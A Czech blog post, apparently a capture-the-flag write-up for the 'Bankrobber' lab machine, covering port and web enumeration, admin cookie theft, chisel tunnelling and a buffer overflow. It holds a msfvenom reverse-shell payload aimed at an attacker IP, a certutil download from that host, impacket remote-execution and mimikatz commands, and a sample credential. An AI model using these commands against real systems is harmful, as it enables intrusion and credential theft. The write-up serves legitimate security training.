---
layout: post
author: Tomáš Matějíček
title: "Bankrobber"
date: 2020-11-02
tags: windows rce smb ssh php
---
## Úvod a kontext

Bankrobber je vícekrokový řetězec, kde samotný web nestačí. Důležité jsou až mezikroky kolem `link.php`, odcizené administrátorské cookie, zpřístupnění interní služby přes `chisel` a nakonec buffer overflow na portu `910`, pro který je potřeba Unicode-safe payload.

Didakticky je tenhle stroj zajímavý hlavně tím, že kombinuje webový vstup, pivot do interního rozhraní a klasickou desktopovou reverzní analýzu v `OllyDbg`. Nejde tedy o jeden exploit, ale o návaznost několika různých disciplín.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 58m39s, deviation: 0s, median: 58m39s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-11-24T21:23:56
|_  start_date: 2019-11-23T21:26:59
```

### Enumerace webu

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
dirb http://$IP
```
```
==> DIRECTORY: http://10.10.10.154/admin/
+ http://10.10.10.154/cgi-bin/ (CODE:403|SIZE:1058)
==> DIRECTORY: http://10.10.10.154/css/
+ http://10.10.10.154/examples (CODE:503|SIZE:1058)
==> DIRECTORY: http://10.10.10.154/fonts/
==> DIRECTORY: http://10.10.10.154/img/
+ http://10.10.10.154/index.php (CODE:200|SIZE:8245)
==> DIRECTORY: http://10.10.10.154/js/
+ http://10.10.10.154/licenses (CODE:403|SIZE:1203)
+ http://10.10.10.154/phpmyadmin (CODE:403|SIZE:1203)
+ http://10.10.10.154/prn (CODE:403|SIZE:1044)
+ http://10.10.10.154/server-info (CODE:403|SIZE:1203)
+ http://10.10.10.154/server-status (CODE:403|SIZE:1203)
==> DIRECTORY: http://10.10.10.154/user/
+ http://10.10.10.154/webalizer (CODE:403|SIZE:1044)

---- Entering directory: http://10.10.10.154/admin/ ----
+ http://10.10.10.154/admin/index.php (CODE:200|SIZE:40)

---- Entering directory: http://10.10.10.154/Admin/ ----
+ http://10.10.10.154/Admin/index.php (CODE:200|SIZE:40)

---- Entering directory: http://10.10.10.154/ADMIN/ ----
+ http://10.10.10.154/ADMIN/index.php (CODE:200|SIZE:40)

---- Entering directory: http://10.10.10.154/user/ ----
+ http://10.10.10.154/user/index.php (CODE:200|SIZE:39)
```

### Enumerace webu (2)

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
dirb http://$IP -X .php
```
```
http://10.10.10.154/index.php
http://10.10.10.154/link.php
http://10.10.10.154/login.php
http://10.10.10.154/logout.php
http://10.10.10.154/register.php
http://10.10.10.154/user/transfer.php

=> document.cookie="id=3; username=dGhhY2tlcg%3D%3D; password=__CENSORED__
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap $IP -p 139,445 -v --script=smb-enum* --script-args=smbuser=root,smbpass=pass,smbdomain=workgroup
```

### Enumerace SMB

U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
```bash
smbclient -L $IP -N
```

## Získání přístupu

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
more user.txt
```
```
__CENSORED__
```

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```text
msfvenom --platform Windows --payload windows/x64/shell/reverse_tcp -f psh -e x86/unicode_mixed -b "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" BufferRegister=EAX LHOST=10.10.14.223 LPORT=4002
```
```
wine64 /usr/share/windows-resources/ollydbg/OLLYDBG.EXE

ruby /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 256
__CENSORED__

ruby /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q Aa0A

certutil.exe -urlcache -split -f http://10.10.14.223:8000/exe/chisel_windows_amd64.exe chisel_windows_amd64.exe
chisel_windows_amd64.exe client 10.10.14.223:8008 R:910:0.0.0.0:910
chisel server -p 8008 --reverse
```

### Spuštění exploitu (2)

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```bash
impacket-samrdump -csv $IP
```
```
./impacket/examples/lookupsid.py cortin:"P4rkeerpl44ts\0"@$IP
./impacket/examples/getArch.py -target $IP
./impacket/examples/atexec.py $IP cmd
./impacket/examples/dcomexec.py $IP cmd
./impacket/examples/GetADUsers.py -all domain/administator@$IP // domain
./impacket/examples/GetNPUsers.py $IP // domain
./impacket/examples/GetUserSPNs.py $IP // domain
./impacket/examples/smbexec.py $IP
./impacket/examples/wmiexec.py $IP
./impacket/examples/psexec.py $IP
./impacket/examples/lookupsid.py $IP
./impacket/examples/mimikatz.py $IP
./impacket/examples/mqtt_check.py $IP
./impacket/examples/mssqlclient.py $IP
./impacket/examples/rdp_check.py $IP

./windapsearch/windapsearch.py --dc-ip $IP --full --functionality -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers --gpos  > windapsearch.txt
./windapsearch/windapsearch.py --dc-ip $IP -u user -p pass --full --functionality -G -U -PU -C --da --admin-objects --user-spns --unconstrained-users --unconstrained-computers --gpos  > windapsearch.txt
```

`windapsearch` se tady hodí jako rychlá LDAP inventura po získání doménového kontextu. Praktickou roli tohoto nástroje rozebírám i v článku [windapsearch](/nastroje/windapsearch).

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
more root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- První skutečný posun přinesla práce s webem: `link.php`, administrátorská cookie a interní funkce dostupné až po převzetí session.
- Další krok dává smysl teprve po tunelování interní služby přes `chisel`, protože samotný buffer overflow běží mimo veřejně dostupnou část aplikace.
- Závěrečná kompromitace stojí na ručně připraveném Unicode-safe payloadu a analýze offsetu v `OllyDbg`, ne na dalším webovém endpointu.

## Co si odnést do praxe

- Session cookies a administrativní workflow v interních bankovních nebo transakčních aplikacích je potřeba chránit stejně přísně jako hesla. Jakmile útočník převezme admin session, získá přístup k úplně jiné vrstvě funkcí než běžný uživatel.
- Reverzní tunely typu `chisel` jsou v interních segmentech velmi praktický pivot. Obrana proto musí sledovat nejen příchozí přístupy, ale i neobvyklá odchozí spojení z hostu.
- Interní klientské nebo desktopové komponenty naslouchající na localhostu nejsou mimo riziko. Pokud mají paměťovou chybu, útočník se k nim po prvním pivotu dostane stejně snadno jako k veřejné službě.
